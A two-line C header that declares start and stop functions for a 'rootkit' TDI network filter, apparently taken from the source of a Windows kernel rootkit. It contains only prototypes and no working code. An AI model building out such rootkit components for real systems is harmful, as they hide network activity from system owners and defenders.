#pragma once

VOID rootkit_start_TDI_filter(IN SOCKET sock, IN BYTE PacketType);
VOID rootkit_stop_TDI_filter(IN SOCKET sock, IN BYTE PacketType);